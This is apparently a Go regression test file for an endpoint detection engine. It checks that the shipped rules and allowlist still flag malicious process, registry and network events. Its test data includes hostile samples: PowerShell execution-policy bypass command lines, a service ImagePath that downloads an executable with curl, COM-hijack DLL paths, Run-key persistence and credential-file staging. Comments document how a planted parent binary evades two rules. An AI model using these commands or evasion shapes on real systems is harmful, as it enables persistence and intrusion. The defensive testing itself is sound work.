package rules

import (
	"os"
	"path/filepath"
	"runtime"
	"testing"

	"sentinel/internal/allowlist"
	"sentinel/internal/event"
	"sentinel/internal/sigmaeval"
)

// These tests load the REAL shipped catalog (rules.d/) and REAL allowlist
// (config/allowlist.json) and assert detection is NOT blinded by them. Unlike
// the synthetic-YAML tests, these fail if someone edits a rule's `except` to
// over-trust a LOLBin, or adds powershell.exe to trusted_binaries. They are the
// "is it blind now?" guarantee, pinned against the actual production config.

// repoRoot returns the path to the repo root from a test running in this
// package dir (internal/rules -> ../..). Tests run with cwd = package dir.
func repoRoot(t *testing.T) string {
	t.Helper()
	_, file, _, ok := runtime.Caller(0)
	if !ok {
		t.Fatal("runtime.Caller failed")
	}
	// file = .../internal/rules/catalog_blindspot_test.go -> root is 2 up.
	return filepath.Join(filepath.Dir(file), "..", "..")
}

// loadRealCatalog loads every rules.d/*.yml exactly like the binary does.
func loadRealCatalog(t *testing.T) []*sigmaeval.Rule {
	t.Helper()
	dir := filepath.Join(repoRoot(t), "rules.d")
	entries, err := os.ReadDir(dir)
	if err != nil {
		t.Skipf("rules.d not present (%v); skipping real-catalog regression", err)
	}
	var concat []byte
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		ext := filepath.Ext(e.Name())
		if ext != ".yml" && ext != ".yaml" {
			continue
		}
		b, err := os.ReadFile(filepath.Join(dir, e.Name()))
		if err != nil {
			t.Fatalf("read %s: %v", e.Name(), err)
		}
		concat = append(concat, b...)
		if len(b) > 0 && b[len(b)-1] != '\n' {
			concat = append(concat, '\n')
		}
		concat = append(concat, "---\n"...)
	}
	rs, err := sigmaeval.Load(concat)
	if err != nil {
		t.Fatalf("load real catalog: %v", err)
	}
	return rs
}

// loadRealAllowlist loads the shipped config/allowlist.json (JSONC).
func loadRealAllowlist(t *testing.T) *allowlist.Allowlist {
	t.Helper()
	al, err := allowlist.Load(filepath.Join(repoRoot(t), "config", "allowlist.json"))
	if err != nil {
		t.Skipf("allowlist.json not present (%v); skipping real-config regression", err)
	}
	return al
}

// realEngine builds an Engine from the real catalog + real allowlist.
func realEngine(t *testing.T) *Engine {
	t.Helper()
	return mustNewEngine(t, loadRealCatalog(t), loadRealAllowlist(t))
}

func mustNewEngine(t *testing.T, rs []*sigmaeval.Rule, al Allowlist) *Engine {
	t.Helper()
	eng, err := New(rs, al, newMemDedup())
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	return eng
}

func hitRuleIDs(res *Evaluation) []string {
	out := make([]string, len(res.Hits))
	for i, h := range res.Hits {
		out[i] = h.RuleID
	}
	return out
}

func containsRule(ids []string, want string) bool {
	for _, id := range ids {
		if id == want {
			return true
		}
	}
	return false
}

// TestCursorPowershellBypassStillDetected is the HEADLINE regression: the exact
// event seen in the operator's live log — cursor.exe spawns
// powershell -ExecutionPolicy Bypass -File ...\Temp\ps-script.ps1. Cursor IS in
// trusted_binaries, but the acting image is powershell.exe (a LOLBin, NOT
// trusted), so EXEC-001 and PERSIST-001 MUST both fire critical alerts. This
// pins that the allowlist scopes trust by IMAGE and does not blanket-suppress.
// If this fails, detection is genuinely blinded (likely powershell got added to
// trusted_binaries, or a rule's except was widened).
func TestCursorPowershellBypassStillDetected(t *testing.T) {
	eng := realEngine(t)
	res := eng.Evaluate(&event.Event{
		EID:      1,
		RecordID: 316051,
		Image:    `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
		CmdLine:  `C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -NonInteractive -File C:\Users\jurij\AppData\Local\Temp\ps-script-deadbeef.ps1`,
	})
	ids := hitRuleIDs(res)
	if !containsRule(ids, "EXEC-001") {
		t.Errorf("EXEC-001 must fire on cursor's bypass powershell; got hits %v\n(this means the allowlist over-trusted and detection is blinded)", ids)
	}
	if !containsRule(ids, "PERSIST-001") {
		t.Errorf("PERSIST-001 must fire (Temp + bypass); got hits %v", ids)
	}
	// Both must be critical + routed to popup (the operator-visible guarantee).
	for _, h := range res.Hits {
		if h.RuleID != "EXEC-001" && h.RuleID != "PERSIST-001" {
			continue
		}
		if h.Severity != event.SevCritical {
			t.Errorf("%s severity=%v want critical", h.RuleID, h.Severity)
		}
	}
}

// TestUntrustedProcessInTempStillFires is the control: an untrusted payload
// living in Temp with a random/hex name (EXEC-004) fires — the allowlist is a
// narrowing exception, not the only thing keeping detection alive. Pairs with
// TestCursorNetworkIsScopedSuppressed to show both directions of scoped trust.
func TestUntrustedProcessInTempStillFires(t *testing.T) {
	eng := realEngine(t)
	res := eng.Evaluate(&event.Event{
		EID:   1,
		Image: `C:\Users\jurij\AppData\Local\Temp\a1b2c3d4.exe`,
	})
	if !containsRule(hitRuleIDs(res), "EXEC-004") {
		t.Errorf("an untrusted Temp hex-name exe must fire EXEC-004; got hits %v\n(detection is blinded or EXEC-004's except over-trusts)", hitRuleIDs(res))
	}
}

// TestCursorNetworkIsScopedSuppressed proves the allowlist DOES work and IS
// scoped: cursor's routine outbound traffic IS suppressed by NET-002 (cursor is
// a dev tool that needs network), while the same connection from an untrusted
// image would fire. This is the other half of "not blind" — we trust narrowly,
// not broadly. If this stops being suppressed, the allowlist broke; if an
// untrusted image stops firing, detection broke.
func TestCursorNetworkIsScopedSuppressed(t *testing.T) {
	eng := realEngine(t)
	// cursor -> public IP: allowlisted, suppressed (NET-002 excepts dev tools).
	sup := eng.Evaluate(&event.Event{
		EID: 3, RecordID: 1,
		Image: `C:\Users\jurij\AppData\Local\Programs\cursor\Cursor.exe`,
		DstIP: "203.0.113.9", DstPort: 443,
	})
	if !containsSuppressed(sup, "NET-002", "allowlist") {
		t.Errorf("cursor outbound should be allowlist-suppressed by NET-002; got hits=%v supp=%v",
			hitRuleIDs(sup), suppRuleIDs(sup))
	}
	// Same connection from an untrusted image: MUST fire NET-002.
	fire := eng.Evaluate(&event.Event{
		EID: 3, RecordID: 2,
		Image: `C:\Users\jurij\Downloads\implant.exe`,
		DstIP: "203.0.113.9", DstPort: 443,
	})
	if !containsRule(hitRuleIDs(fire), "NET-002") {
		t.Errorf("untrusted implant outbound MUST fire NET-002 (allowlist must not blanket-suppress); got hits=%v", hitRuleIDs(fire))
	}
}

// TestCursorAgentScriptBridgeSuppressed pins the Cursor agent shell-bridge
// filters added to EXEC-001 and PERSIST-001 (2026-09 noise tuning, see
// docs/found_noise.md): the real bridge launch — cursor.exe install-path
// parent + the exact `powershell -ExecutionPolicy Bypass -NonInteractive
// -File <Temp>\ps-script-<GUID>.ps1` cmdline — is quieted, while the SAME
// cmdline under any other parent (the mimic/dropper case, i.e. the original
// incident shape) still fires BOTH rules, and appending any payload argument
// after the script path re-arms EXEC-001. Forensics are preserved by
// file_capture.patterns (vault snapshot), not asserted here.
func TestCursorAgentScriptBridgeSuppressed(t *testing.T) {
	eng := realEngine(t)
	bridgeCmd := `C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -NonInteractive -File C:\Users\jurij\AppData\Local\Temp\ps-script-ee8f8c48-f92b-4ac2-9d0f-ea3b35e93f40.ps1`
	for _, parent := range []string{
		`C:\Users\jurij\AppData\Local\Programs\cursor\cursor.exe`,   // main install
		`C:\Users\jurij\AppData\Local\Programs\cursor\_\cursor.exe`, // update-staging variant
	} {
		res := eng.Evaluate(&event.Event{EID: 1, RecordID: 10, Image: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
			ParentImage: parent, CmdLine: bridgeCmd})
		if ids := hitRuleIDs(res); containsRule(ids, "EXEC-001") || containsRule(ids, "PERSIST-001") {
			t.Errorf("cursor-parented bridge (%s) should be filtered; got hits %v", parent, ids)
		}
	}
	// Mimic: identical cmdline under a cmd.exe parent — the original incident
	// shape (a dropper reusing Cursor's script name) — MUST fire both rules.
	mimic := eng.Evaluate(&event.Event{EID: 1, RecordID: 11, Image: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
		ParentImage: `C:\Windows\System32\cmd.exe`, CmdLine: bridgeCmd})
	ids := hitRuleIDs(mimic)
	if !containsRule(ids, "EXEC-001") || !containsRule(ids, "PERSIST-001") {
		t.Errorf("ps-script mimic under cmd.exe must fire EXEC-001+PERSIST-001; got %v", ids)
	}
	// Payload appended after the script path: the bridge filter's $-anchor
	// must fail and EXEC-001 must stay armed even with the real cursor parent.
	tampered := eng.Evaluate(&event.Event{EID: 1, RecordID: 12, Image: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
		ParentImage: `C:\Users\jurij\AppData\Local\Programs\cursor\cursor.exe`,
		CmdLine:     bridgeCmd + ` -ArgumentList evil`})
	if !containsRule(hitRuleIDs(tampered), "EXEC-001") {
		t.Errorf("appended payload arg must keep EXEC-001 armed; got %v", hitRuleIDs(tampered))
	}
}

// TestServiceAndComRegistrationNoiseScoped pins the PERSIST-005/PERSIST-006
// condition filters from the 2026-09 noise tuning: benign service/COM
// registration churn is quieted WITHOUT arming holes for the attack shapes
// (attack side is separately pinned by the vector table).
func TestServiceAndComRegistrationNoiseScoped(t *testing.T) {
	eng := realEngine(t)
	quiet := []struct {
		name string
		ev   event.Event
	}{
		{"WpnUserService per-user svchost ImagePath (every logon)", event.Event{EID: 13,
			Image:        `C:\Windows\System32\services.exe`,
			TargetRegKey: `HKLM\System\CurrentControlSet\Services\WpnUserService_11dc25\ImagePath`,
			Details:      `C:\WINDOWS\system32\svchost.exe -k UnistackSvcGroup`}},
		{"MSI Afterburner RTCore64 driver ImagePath (kernel ??-prefix form, spaces)", event.Event{EID: 13,
			Image:        `C:\Windows\System32\services.exe`,
			TargetRegKey: `HKLM\System\CurrentControlSet\Services\RTCore64\ImagePath`,
			Details:      `\??\C:\Program Files (x86)\MSI Afterburner\RTCore64.sys`}},
		{"Edge elevation service ImagePath (quoted, spaces)", event.Event{EID: 13,
			Image:        `C:\Windows\System32\services.exe`,
			TargetRegKey: `HKLM\System\CurrentControlSet\Services\MicrosoftEdgeElevationService\ImagePath`,
			Details:      `"C:\Program Files (x86)\Microsoft\Edge\Application\151.0.4129.93\installer\elevation_service.exe"`}},
		{"Hyper-V vSwitch vNIC FriendlyName churn", event.Event{EID: 13,
			Image:        `C:\Windows\System32\svchost.exe`,
			TargetRegKey: `HKLM\System\CurrentControlSet\Services\vmsmp\parameters\SwitchList\C08CB7B8-9B3C-408E-8E30-5E16A3AEB444\C08CB7B8-9B3C-408E-8E30-5E16A3AEB445\FriendlyName`,
			Details:      `Host Vnic C08CB7B8-9B3C-408E-8E30-5E16A3AEB444`}},
		{"nahimicservice HKCR COM registration (machine hive)", event.Event{EID: 13,
			Image:        `C:\Windows\System32\nahimicservice.exe`,
			TargetRegKey: `HKCR\CLSID\{cdf28580-2862-11e9-b56e-0800200c9a66}\InprocServer32\(Default)`,
			Details:      `C:\WINDOWS\system32\NahimicAPO4ExpertAPI.dll`}},
		{"Docker Desktop bare cscript helper (image name is the whole cmdline)", event.Event{EID: 1,
			Image: `C:\Windows\System32\cscript.exe`, CmdLine: `cscript.exe`,
			ParentImage: `C:\Program Files\Docker\Docker\frontend\Docker Desktop.exe`}},
	}
	for _, q := range quiet {
		if ids := hitRuleIDs(eng.Evaluate(&q.ev)); containsRule(ids, "PERSIST-005") || containsRule(ids, "PERSIST-006") || containsRule(ids, "EXEC-003") {
			t.Errorf("%s: should be filtered, got hits %v", q.name, ids)
		}
	}
	armed := []struct {
		name string
		rule string
		ev   event.Event
	}{
		{"ImagePath arg-injection via system binary", "PERSIST-005", event.Event{EID: 13,
			Image:        `C:\Windows\System32\services.exe`,
			TargetRegKey: `HKLM\System\CurrentControlSet\Services\Evil\ImagePath`,
			Details:      `C:\WINDOWS\system32\cmd.exe /c curl http://203.0.113.9/s.exe`}},
		{"ImagePath into user-writable dir", "PERSIST-005", event.Event{EID: 13,
			Image:        `C:\Windows\System32\services.exe`,
			TargetRegKey: `HKLM\System\CurrentControlSet\Services\Evil2\ImagePath`,
			Details:      `C:\Users\Public\svc.exe`}},
		// regkey below is the literal Sysmon rendering observed live 2026-09-01
		// via a real HKCU\Software\Classes hijack write: HKU\<SID>_Classes\...
		// (user hive), NOT HKCR (that is how admin-context writers render).
		{"HKCU CLSID shadow (true T1546.015, observed form)", "PERSIST-006", event.Event{EID: 13,
			Image:        `C:\Users\jurij\Downloads\implant.exe`,
			TargetRegKey: `HKU\S-1-5-21-1203942427-900000150-243797717-1001_Classes\CLSID\{deadbeef-0000-4000-8000-000000000000}\InprocServer32\(Default)`,
			Details:      `C:\Users\jurij\AppData\Local\Temp\evil.dll`}},
		{"ImagePath dotdot traversal: string says windows, resolves to Users Public",
			"PERSIST-005", event.Event{EID: 13, Image: `C:\Windows\System32\services.exe`,
				TargetRegKey: `HKLM\System\CurrentControlSet\Services\Evil3\ImagePath`,
				Details:      `C:\Windows\..\..\Users\Public\svc.exe`}},
		{"ImagePath in Users-writable Windows Temp (string sits in trusted prefix)",
			"PERSIST-005", event.Event{EID: 13, Image: `C:\Windows\System32\services.exe`,
				TargetRegKey: `HKLM\System\CurrentControlSet\Services\Evil4\ImagePath`,
				Details:      `C:\Windows\Temp\svc.exe`}},
		{"quoted dotdot traversal into Users Public",
			"PERSIST-005", event.Event{EID: 13, Image: `C:\Windows\System32\services.exe`,
				TargetRegKey: `HKLM\System\CurrentControlSet\Services\Evil5\ImagePath`,
				Details:      `"C:\Program Files\..\..\Users\Public\x.exe"`}},
		{"machine-hive COM with user-writable payload (weak-ACL CLSID abuse)",
			"PERSIST-006", event.Event{EID: 13, Image: `C:\Windows\System32\regsvr32.exe`,
				TargetRegKey: `HKCR\CLSID\{1814CEEB-49E2-407F-AF99-FA755A7D2607}\InProcServer32\(Default)`,
				Details:      `C:\Users\jurij\AppData\Local\Temp\evil.dll`}},
		{"machine-hive COM with forward-slash user-writable payload",
			"PERSIST-006", event.Event{EID: 13, Image: `C:\Windows\System32\regsvr32.exe`,
				TargetRegKey: `HKCR\CLSID\{1814CEEB-49E2-407F-AF99-FA755A7D2607}\InProcServer32\(Default)`,
				Details:      `C:/Users/Public/evil.dll`}},
		{"machine-hive COM with REG_EXPAND_SZ %PUBLIC% payload",
			"PERSIST-006", event.Event{EID: 13, Image: `C:\Windows\System32\regsvr32.exe`,
				TargetRegKey: `HKCR\CLSID\{1814CEEB-49E2-407F-AF99-FA755A7D2607}\InProcServer32\(Default)`,
				Details:      `%PUBLIC%\App\evil.dll`}},
		{"REGISTRY A app-key hive CLSID write",
			"PERSIST-006", event.Event{EID: 13, Image: `C:\Users\jurij\Downloads\implant.exe`,
				TargetRegKey: `\REGISTRY\A\{app-key}\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A1D3}\InprocServer32\(Default)`,
				Details:      `C:\Users\jurij\AppData\Local\Temp\evil.dll`}},
		{"cscript with a real script argument", "EXEC-003", event.Event{EID: 1,
			Image: `C:\Windows\System32\cscript.exe`, CmdLine: `cscript.exe //b C:\ProgramData\reglist.wsf`}},
	}
	for _, a := range armed {
		// fresh engine per row: several rows share Image+empty CmdLine, which is
		// the dedup target_key — a shared engine would dedup row 2 as a repeat of
		// row 1 (same reason TestCatalogVectorRegression builds per-row engines).
		if !containsRule(hitRuleIDs(realEngine(t).Evaluate(&a.ev)), a.rule) {
			t.Errorf("%s: %s must stay armed", a.name, a.rule)
		}
	}
}

func containsSuppressed(res *Evaluation, ruleID, reason string) bool {
	for _, s := range res.Suppressed {
		if s.RuleID == ruleID && s.Reason == reason {
			return true
		}
	}
	return false
}

func suppRuleIDs(res *Evaluation) []string {
	out := make([]string, len(res.Suppressed))
	for i, s := range res.Suppressed {
		out[i] = s.RuleID + "(" + s.Reason + ")"
	}
	return out
}

// TestCursorPathMimicResidualIsBounded documents and PINS the one real
// impersonation residual of the cursor agent-bridge filters: a binary PLANTED
// at the user-writable cursor install path (Bypass-B — condition-level
// filters cannot Tier-2 signature-gate the parent, because the child's EID 1
// event carries no parent SHA256 and the trust cache is SHA-keyed, not
// path-keyed, by anti-swap design) CAN suppress EXEC-001/PERSIST-001 for the
// exact bridge cmdline shape. This test pins that the residual is bounded to
// exactly those two rules for exactly that shape: the same actor's follow-on
// behavior still fires the rules that matter. If one of these "must fire"
// cases goes quiet, someone widened a path trust and detection is blinded.
func TestCursorPathMimicResidualIsBounded(t *testing.T) {
	mimicParent := `C:\Users\jurij\AppData\Local\Programs\cursor\cursor.exe`
	bridge := event.Event{EID: 1, RecordID: 20, Image: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
		ParentImage: mimicParent,
		CmdLine:     `C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -NonInteractive -File C:\Users\jurij\AppData\Local\Temp\ps-script-deadbeef-0000-4000-8000-000000000000.ps1`}
	// The residual itself, stated as a fact so a future "fix" that changes
	// this silently gets reviewed: both rules are quiet for this shape.
	ids := hitRuleIDs(realEngine(t).Evaluate(&bridge))
	if containsRule(ids, "EXEC-001") || containsRule(ids, "PERSIST-001") {
		t.Errorf("expected the documented mimic residual to hold (quiet); if this now fires, the filter was narrowed — update this test deliberately. got %v", ids)
	}
	// The same actor (fake cursor.exe at the Tier-2 path, unsigned/unhashed)
	// doing literally anything else still alerts. Registry/network events
	// carry no process SHA256, so Tier-2 fails closed there by design.
	fire := []struct {
		name string
		rule string
		ev   event.Event
	}{
		{"bridge child beacons to a public IP", "NET-002", event.Event{EID: 3, RecordID: 21,
			Image: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, ParentImage: mimicParent,
			DstIP: "203.0.113.9", DstPort: 443}},
		{"bridge child hits a non-baseline loopback listener", "NET-005", event.Event{EID: 3, RecordID: 22,
			Image: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, ParentImage: mimicParent,
			DstIP: "127.0.0.1", DstPort: 58172}},
		{"planted cursor.exe writes a Run key (EID 13: no SHA256, Tier-2 fails closed)", "PERSIST-003", event.Event{EID: 13, RecordID: 23,
			Image:        mimicParent,
			TargetRegKey: `HKU\S-1-5-21-999\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveUpdate`}},
		{"bridge child drops a Startup .lnk", "PERSIST-004", event.Event{EID: 11, RecordID: 24,
			Image: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, ParentImage: mimicParent,
			TargetFile: `C:\Users\jurij\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\updater.lnk`}},
		{"bridge child stages the browser vault", "CRED-001", event.Event{EID: 11, RecordID: 25,
			Image: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, ParentImage: mimicParent,
			TargetFile: `C:\Users\jurij\AppData\Local\Temp\logins.json`}},
		{"planted cursor.exe CreateRemoteThread into notepad", "INJECT-001", event.Event{EID: 8, RecordID: 26,
			Image: mimicParent, TargetImage: `C:\Windows\System32\notepad.exe`}},
	}
	for _, f := range fire {
		if !containsRule(hitRuleIDs(realEngine(t).Evaluate(&f.ev)), f.rule) {
			t.Errorf("%s: %s must stay armed for the mimic actor", f.name, f.rule)
		}
	}
	// Every deviation from the exact bridge form re-arms EXEC-001:
	// trailing arg, prefix arg smuggled before -ExecutionPolicy, non-GUID
	// script name, script in a Temp dir outside the user profile, or a
	// parent in a directory merely NAMED cursor (Downloads/Temp plant -
	// the filter is anchored to the AppData install path).
	deviant := bridge
	deviant.RecordID = 27
	deviant.CmdLine += ` -WindowStyle Hidden`
	if !containsRule(hitRuleIDs(realEngine(t).Evaluate(&deviant)), "EXEC-001") {
		t.Errorf("trailing arg must re-arm EXEC-001")
	}
	prefix := bridge
	prefix.RecordID = 28
	prefix.CmdLine = `C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NonInteractive -File C:\Users\jurij\AppData\Local\Temp\ps-script-deadbeef-0000-4000-8000-000000000000.ps1`
	if !containsRule(hitRuleIDs(realEngine(t).Evaluate(&prefix)), "EXEC-001") {
		t.Errorf("prefix-arg smuggling must re-arm EXEC-001")
	}
	nonGuid := bridge
	nonGuid.RecordID = 29
	nonGuid.CmdLine = `C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -NonInteractive -File C:\Users\jurij\AppData\Local\Temp\ps-script-payload.ps1`
	if !containsRule(hitRuleIDs(realEngine(t).Evaluate(&nonGuid)), "EXEC-001") {
		t.Errorf("non-GUID script name must re-arm EXEC-001")
	}
	foreignTemp := bridge
	foreignTemp.RecordID = 30
	foreignTemp.CmdLine = `C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -NonInteractive -File C:\ProgramData\Temp\ps-script-deadbeef-0000-4000-8000-000000000000.ps1`
	if !containsRule(hitRuleIDs(realEngine(t).Evaluate(&foreignTemp)), "EXEC-001") {
		t.Errorf("script outside the user-profile Temp must re-arm EXEC-001")
	}
	for _, fakeParent := range []string{
		`C:\Users\jurij\Downloads\cursor\cursor.exe`,
		`C:\Users\jurij\AppData\Local\Temp\cursor\cursor.exe`,
	} {
		plant := bridge
		plant.RecordID++
		plant.ParentImage = fakeParent
		ids2 := hitRuleIDs(realEngine(t).Evaluate(&plant))
		if !containsRule(ids2, "EXEC-001") || !containsRule(ids2, "PERSIST-001") {
			t.Errorf("cursor-named dir plant (%s) must fire both rules; got %v", fakeParent, ids2)
		}
	}
	// DOCUMENTED PRE-EXISTING hole (not introduced by the tuning): the planted
	// parent's OWN outbound to a public IP is NET-quiet via dev_tool_paths
	// (path-only, no signature - Bypass-B). If this assert ever fails because
	// someone added signature gating for dev tools: good - delete this row.
	pube := event.Event{EID: 3, RecordID: 40, Image: mimicParent, DstIP: "203.0.113.9", DstPort: 443}
	if containsRule(hitRuleIDs(realEngine(t).Evaluate(&pube)), "NET-002") {
		t.Errorf("parent NET-quiet was expected (pre-existing dev_tool_paths Bypass-B); it changed - review")
	}
	for _, dst := range []string{"127.0.0.1", "0:0:0:0:0:0:0:1"} {
		loopb := event.Event{EID: 3, RecordID: 41, Image: mimicParent, DstIP: dst, DstPort: 58172}
		if !containsRule(hitRuleIDs(realEngine(t).Evaluate(&loopb)), "NET-005") {
			t.Errorf("NET-005 loopback (%s) must stay armed even for the planted parent", dst)
		}
	}
}

// TestColonFormFlagsStillFire pins the round-2 adversarial-review fix:
// PowerShell accepts BOTH '-ep bypass' and '-ep:bypass' (colon-separated
// parameters) - the colon forms evaded the original keyword lists while
// still executing, with no cursor parent and no filter to beat.
func TestColonFormFlagsStillFire(t *testing.T) {
	for _, cl := range []string{
		`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy:Bypass -NonInteractive -File C:\Users\jurij\AppData\Local\Temp\x.ps1`,
		`powershell.exe -ep:Bypass -File C:\Temp\y.ps1`,
		`powershell.exe -w:Hidden -enc:AAAABBBB`,
		`powershell.exe -WindowStyle:Hidden -exec:Bypass -File C:\ProgramData\z.ps1`,
	} {
		ev := event.Event{EID: 1, RecordID: 60, Image: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, CmdLine: cl}
		if !containsRule(hitRuleIDs(realEngine(t).Evaluate(&ev)), "EXEC-001") {
			t.Errorf("colon-form flags must fire EXEC-001: %s", cl)
		}
	}
	// PERSIST-001: colon bypass + user-writable path
	ev := event.Event{EID: 1, RecordID: 61, Image: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
		CmdLine: `powershell.exe -ExecutionPolicy:Bypass -File C:\ProgramData\one.ps1`}
	if !containsRule(hitRuleIDs(realEngine(t).Evaluate(&ev)), "PERSIST-001") {
		t.Errorf("colon-form bypass from a user-writable path must fire PERSIST-001")
	}
}
